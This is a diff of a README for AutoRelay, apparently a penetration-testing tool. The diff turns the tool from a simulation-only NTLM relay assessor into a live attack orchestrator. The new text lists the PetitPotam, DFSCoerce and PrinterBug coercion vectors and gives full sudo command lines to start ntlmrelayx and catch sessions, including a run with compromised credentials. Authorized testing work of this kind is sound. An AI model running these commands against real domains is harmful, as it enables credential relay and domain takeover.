@@ -1,54 +1,115 @@
 # AutoRelay
 
-Authorized Active Directory assessment tool for identifying NTLM relay exposure, simulating relay-session lifecycles in-process, and generating remediation reports.
+**AutoRelay** is an authorized Active Directory assessment tool designed to automate the lifecycle of an NTLM Relay attack.
 
-## Description
-
-AutoRelay helps security teams assess NTLM relay exposure in Active Directory environments before performing controlled security tests.
-
-The tool performs preflight checks, identifies relevant security weaknesses and coercion vectors, simulates relay-session lifecycle behavior without network or authentication activity, records assessment results, and generates remediation guidance.
-
-AutoRelay is designed for authorized security assessments and controlled laboratory environments.
+It handles the entire orchestration process: from reconnaissance and vulnerability scanning, to starting the relay server, firing coercion vectors, and generating professional client-facing reports.
 
 ## Features
 
-- NTLM relay preflight assessment
-- SMB and LDAP security checks
-- Coercion vector detection
-- Simulation-only relay lifecycle orchestration (no network or credential handling)
-- Structured logging
-- Remediation reporting
-- CLI-based operation
+*   **Preflight Assessment:** Checks target reachability, SMB signing status, LDAP signing, and coercion vector availability without firing any offensive traffic.
+*   **Relay Orchestration:** Automatically starts and manages `ntlmrelayx` in the background, parsing its output in real-time to detect intercepted sessions.
+*   **Coercion Dispatcher:** Attempts multiple coercion vectors in sequence (PetitPotam, DFSCoerce, PrinterBug), with support for authenticated coercion using compromised credentials.
+*   **Safety Guardrails:** Enforces strict scope files in `live` mode to prevent accidental out-of-scope attacks. Refuses to run if `--yes` is used in production.
+*   **Reporting:** Generates detailed Markdown and HTML reports mapping findings to concrete remediations.
 
-## Relay assessment
+## Requirements
 
-Simulation and active assessment are separate modes. Simulation performs no network activity. Active assessment is limited to explicitly supplied authorized private/lab IPs and reports service reachability, SMB signing negotiation, LDAP signing/channel-binding evidence requirements, and LDAPS TLS/certificate validation. It does not authenticate or test relay susceptibility.
+*   **OS:** Linux (Kali, Ubuntu, Debian) or WSL
+*   **Python:** 3.10 or higher
+*   **Privileges:** Root/Sudo required to bind to privileged ports (445, 80) for the relay server.
 
-Install the SMB negotiation dependency:
+## Installation
 
-python -m pip install -r requirements.txt
+```bash
+# 1. Clone the repository
+git clone https://github.com/yourusername/autorelay.git
+cd autorelay
 
-Example authorized lab assessment (certificate validation uses the system trust store by default):
+# 2. Create a virtual environment
+python3 -m venv .venv
+source .venv/bin/activate
 
-python autorelay.py relay --mode assessment --authorized-lab --target 10.20.30.40 --timeout 1
+# 3. Install dependencies
+pip install --upgrade pip
+pip install -r requirements.txt
 
-To add an authorized lab CA bundle while retaining certificate verification:
+# 4. Verify installation
+python autorelay.py --help
 
-python autorelay.py relay --mode assessment --authorized-lab --target 10.20.30.40 --timeout 1 --tls-ca-file C:\lab\root-ca.pem
+Usage
+AutoRelay has two execution profiles:
+
+goad (Lab): No scope enforcement. Use this for testing against intentionally vulnerable labs (like GOAD).
+
+live (Production): Strict scope enforcement. Requires a scope.yaml file and will refuse to attack out-of-scope IPs.
+
+1. Preflight (Read-Only)
+Check if a target environment is vulnerable to an NTLM relay attack. This command performs no active attacks.
+
+python autorelay.py --profile goad preflight \
+    --target 192.168.56.10 \
+    --relay-targets 192.168.56.10 \
+    --html report.html \
+    --json report.json
+
+2. Run (Active Attack)
+Execute the full attack chain: Preflight -> Start Relay -> Fire Coercion -> Catch Session.
+
+Before running the live profile, you must create a scope file:
+
+# Copy the template
+cp scope.example.yaml scope.yaml
+
+# Edit the file and add the authorized IPs
+nano scope.yaml
+
+Unauthenticated Coercion (Older/Lab environments):
+This uses PetitPotam or DFSCoerce without credentials. It is often blocked by modern Windows patches.
+
+sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
+    --target 10.10.10.5 \
+    --relay-targets 10.10.10.5 \
+    --listener-ip 10.10.10.100 \
+    --timeout 60
+
+Authenticated Coercion (Modern/Patched environments):
+If you have compromised credentials (e.g., a low-privileged user), you can bypass anonymous restrictions on modern Domain Controllers.
+
+sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
+    --target 10.10.10.5 \
+    --relay-targets 10.10.10.5 \
+    --listener-ip 10.10.10.100 \
+    --username jdoe \
+    --password 'Password123!' \
+    --domain CORP \
+    --timeout 60
+
+3. Manual Trigger (For Demos or Blocked Coercion)
+If all coercion vectors are patched on the target (common in Windows Server 2022), you can skip the automated trigger and wait for a manual connection. This is useful for demonstrating the relay engine itself.
+
+sudo .venv/bin/python autorelay.py --profile live --scope scope.yaml run \
+    --target 10.10.10.5 \
+    --relay-targets 10.10.10.5 \
+    --listener-ip 10.10.10.100 \
+    --no-coerce \
+    --timeout 120
+
+Project Structure
+
+autorelay/
+├── autorelay.py          # CLI entry point and orchestrator
+├── config.py             # Profile loader and scope enforcement
+├── config.yaml           # Profile definitions (goad/live)
+├── scope.example.yaml    # Template for authorization scope
+├── requirements.txt      # Python dependencies
+├── preflight/            # Read-only reconnaissance checks
+├── coercion/             # Coercion vectors (PetitPotam, DFSCoerce, PrinterBug)
+├── relay/                # ntlmrelayx subprocess wrapper
+├── report/               # Markdown and HTML report generation
+└── util/                 # Logging, networking, and helpers
+
 
 See [Module Interfaces](docs/MODULE_INTERFACES.md#relay) for supported checks, finding interpretation, limits, and LDAP policy evidence requirements.
-
-## Project Structure
-
-autorelay.py    # CLI entry point and orchestrator
-preflight/      # Vulnerability and configuration checks
-coercion/       # Coercion modules
-relay/          # Simulation-only relay session lifecycle
-post/           # Opt-in post-exploitation actions
-report/         # Findings and remediation reports
-util/           # Shared utilities
-tests/          # Tests and fixtures
-
 
 ## Documentation
 
